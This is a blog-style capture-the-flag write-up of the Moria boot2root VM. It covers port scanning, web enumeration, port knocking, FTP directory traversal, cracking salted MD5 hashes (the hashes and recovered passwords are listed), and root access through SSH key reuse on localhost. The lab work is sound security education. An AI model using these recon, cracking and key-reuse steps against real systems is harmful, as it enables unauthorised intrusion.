---
layout: post
title:  "Moria boot2root machine"
date:   2017-03-21
categories: ctf
---
<br />
Hello everyone,  
  
This time i would like to share with you a write-up about the Moria's VM.  
Big up to [@abatchy](http://www.abatchy.com/) for creating and sharing this one!  
  
So let's start, what do we have over here:  
  
### SCANNING:  
```bash
root@kali:/tmp# nmap -p 21,22,80 -A -Pn 192.168.1.38

Starting Nmap 7.40 ( https://nmap.org ) at 2017-03-20 12:26 CET
Nmap scan report for Moria (192.168.1.38)
Host is up (0.0012s latency).
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.0.8 or later
22/tcp open  ssh     OpenSSH 6.6.1 (protocol 2.0)
| ssh-hostkey: 
|   2048 47:b5:ed:e3:f9:ad:96:88:c0:f2:83:23:7f:a3:d3:4f (RSA)
|_  256 85:cd:a2:d8:bb:85:f6:0f:4e:ae:8c:aa:73:52:ec:63 (ECDSA)
80/tcp open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
|_http-title: Gates of Moria
MAC Address: 00:0C:29:8D:5F:19 (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.6
Network Distance: 1 hop

TRACEROUTE
HOP RTT     ADDRESS
1   1.18 ms Moria (192.168.1.38)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.28 seconds
```  
  
Let's check these services:  
  
### PORT 21:  

```bash
root@kali:/tmp# ftp 192.168.1.38
Connected to 192.168.1.38.
220 Welcome Balrog!
Name (192.168.1.38.:root): Anonymous
331 Please specify the password.
Password:
530 Login incorrect.
Login failed.
```  
Balrog is a first information, may be a login?  
    
### PORT 22:
```bash
root@kali:/tmp# ssh -v balrog@192.168.1.38 
...
debug1: Authentications that can continue: publickey,gssapi-keyex,gssapi-with-mic,password
...
```  
  
A publickey authentication mechanism, ok i take note.  
  
### PORT 80:  
We are facing the Doors of Durin: [http://tolkiengateway.net/wiki/Doors_of_Durin](http://tolkiengateway.net/wiki/Doors_of_Durin)  
![moria1]({{ site.url }}/public/images/moria/moria1.png)  
  
Let's check what we have:  
```bash
root@kali:/tmp# curl -I http://192.168.1.38
HTTP/1.1 200 OK
Date: Mon, 20 Mar 2017 11:53:50 GMT
Server: Apache/2.4.6 (CentOS) PHP/5.4.16
X-Powered-By: PHP/5.4.16
Content-Type: text/html; charset=UTF-8

root@kali:/tmp# nikto -host http://192.168.1.38
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.1.38
+ Target Hostname:    192.168.1.38
+ Target Port:        80
+ Start Time:         2017-03-20 12:51:28 (GMT1)
---------------------------------------------------------------------------
+ Server: Apache/2.4.6 (CentOS) PHP/5.4.16
+ Retrieved x-powered-by header: PHP/5.4.16
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Apache/2.4.6 appears to be outdated (current is at least Apache/2.4.12). Apache 2.0.65 (final release) and 2.2.29 are also current.
+ PHP/5.4.16 appears to be outdated (current is at least 5.6.9). PHP 5.5.25 and 5.4.41 are also current.
+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
+ OSVDB-12184: /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ OSVDB-12184: /?=PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ OSVDB-12184: /?=PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ OSVDB-3268: /icons/: Directory indexing found.
+ Server leaks inodes via ETags, header found with file /icons/README, fields: 0x13f4 0x438c034968a80 
+ OSVDB-3233: /icons/README: Apache default file found.
+ 8345 requests: 0 error(s) and 14 item(s) reported on remote host
+ End Time:           2017-03-20 12:52:00 (GMT1) (32 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

root@kali:/tmp# gobuster -u http://192.168.1.38/ -w /usr/share/seclists/Discovery/Web_Content/common.txt -s '200,204,301,302,307,403,500' -e

Gobuster v1.2                OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://192.168.1.38/
[+] Threads      : 10
[+] Wordlist     : /usr/share/seclists/Discovery/Web_Content/common.txt
[+] Status codes : 200,204,301,302,307,403,500
[+] Expanded     : true
=====================================================
http://192.168.1.38/.hta (Status: 403)
http://192.168.1.38/.htpasswd (Status: 403)
http://192.168.1.38/.htaccess (Status: 403)
http://192.168.1.38/cgi-bin/ (Status: 403)
http://192.168.1.38/index.php (Status: 200)
http://192.168.1.38/w (Status: 301)
=====================================================
```  

A **w** directory has been found, leading to *http://192.168.1.38/w/h/i/s/p/e/r/the_abyss/*  
  
For each refresh, a dwarf is talking to us. Here are all the dwarves sentences:  
```
Balin: "Be quiet, the Balrog will hear you!"
Dain:"Is that human deaf? Why is it not listening?"
"Eru! Save us!"
Fundin:"That human will never save us!"
"Is this the end?"
"Knock knock"
Maeglin:"The Balrog is not around, hurry!"
Nain:"Will the human get the message?"
Oin:"Stop knocking!"
Ori:"Will anyone hear us?"
Telchar to Thrain:"That human is slow, don't give up yet"
"Too loud!"
"We will die here.."
```  
  
We can first try to bruteforce ftp and ssh with obvious logins/passwords previously gathered, but the doors are filtering us quite quicky.  
May be, as the previous url said to us, something is trying to whisper some information... Let's snif:  
![moria2]({{ site.url }}/public/images/moria/moria2.png)  

Interesting, but does it change something to open these ports? Will someone speak to us ?:  
```bash
for port in 77 101 108 111 110;do xterm -T "listening on port ${port}" -hold -e ncat -klvp ${port} &;done
```  
  
In Wireshark:  
![moria3]({{ site.url }}/public/images/moria/moria3.png)  
  
**RST** packets from Moria. Let's try to port knock with the same sequence:  
```bash
knock 192.168.1.38 77 101 108 108 111 110
```  
  
... Nothing when trying to knock **77 101 108 108 111 110**... hummm...  
```python
>>> import sys
>>> for port in (77,101,108,108,111,110):sys.stdout.write(chr(port));
... 
Mellon
```  
  
'What's the Elvish word for Friend?':  
<iframe width="560" height="315" src="https://www.youtube.com/embed/qnBcg9fsbWE" frameborder="0" allowfullscreen></iframe>  
  
With this password one of the gate will open:  
  
```bash
root@kali:/tmp# ftp 192.168.1.38
Connected to 192.168.1.38.
220 Welcome Balrog!
Name (192.168.1.38:root): Balrog
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
```  

Thanks to directory traversal:  
  
```bash
ftp> cd /var/www/html
250 Directory successfully changed.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        0              23 Mar 12 20:38 QlVraKW4fbIkXau9zkAPNGzviT3UKntl
-r--------    1 48       48             85 Mar 12 19:55 index.php
-r--------    1 48       48         161595 Mar 11 23:12 moria.jpg
drwxr-xr-x    3 0        0              15 Mar 12 04:50 w
226 Directory send OK.
ftp>
```  

Looking at *http://192.168.1.38/QlVraKW4fbIkXau9zkAPNGzviT3UKntl/*:  
![moria5]({{ site.url }}/public/images/moria/moria5.png)  
  
And the source:  
```
6MAp84
bQkChe
HnqeN4
e5ad5s
g9Wxv7
HCCsxP
cC5nTr
h8spZR
tb9AWe

MD5(MD5(Password).Salt)
```  
### FIRST SHELL:  
  
With *hashes.txt* like:  
```
Balin:c2d8960157fc8540f6d5d66594e165e0$6MAp84
Oin:727a279d913fba677c490102b135e51e$bQkChe
Ori:8c3c3152a5c64ffb683d78efc3520114$HnqeN4
Maeglin:6ba94d6322f53f30aca4f34960203703$e5ad5s
Fundin:c789ec9fae1cd07adfc02930a39486a1$g9Wxv7
Nain:fec21f5c7dcf8e5e54537cfda92df5fe$HCCsxP
Dain:6a113db1fd25c5501ec3a5936d817c29$cC5nTr
Thrain:7db5040c351237e8332bfbba757a1019$h8spZR
Telchar:dd272382909a4f51163c77da6356cc6f$tb9AWe
```  
  
Let's crack these hashes:  
![moria6]({{ site.url }}/public/images/moria/moria6.png)  

So we have:  
```
Nain:warrior
Dain:abcdef
Telchar:magic
Oin:rainbow
Ori:spanky
Maeglin:fuckoff
Thrain:darkness
Fundin:hunter2
```  
  
Then:  
![moria4]({{ site.url }}/public/images/moria/moria4.png)  
  
### GET ROOT:  
  
Once logged as Ori:  
![moria7]({{ site.url }}/public/images/moria/moria7.png)  
  
```bash
-bash-4.2$ cd .ssh/
-bash-4.2$ cat known_hosts 
127.0.0.1 ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCuLX/CWxsOhekXJRxQqQH/Yx0SD+XgUpmlmWN1Y8cvmCYJslOh4vE+I6fmMwCdBfi4W061RmFc+vMALlQUYNz0=
```  
  
This **known_hosts** file is local to the user account and contains the known keys for remote hosts.  
So we know that Ori sshed on localhost. Publickey auth mechanism is on.  
Unfortunately we can not read the sshd_config to check if ssh allows root login.  

Let's give a try to check if Ori's pubkey has been deployed in root's authorized_keys:  
```bash
-bash-4.2$ ssh -v root@127.0.0.1 -i ./id_rsa
...
Last login: Tue Mar 14 23:56:24 2017
[root@Moria ~]# id
uid=0(root) gid=0(root) groupes=0(root)
```  

Boummmm! here we go. The doors are opened.  
Hope you enjoyed.  
  
See you soon for more infosec stuff!  
  
Phackt.  
  
References:  
 - [Abatchy's blog download page](http://www.abatchy.com/2017/03/moria-boot2root-vm.html)
 - [Vulnhub download page]()
  

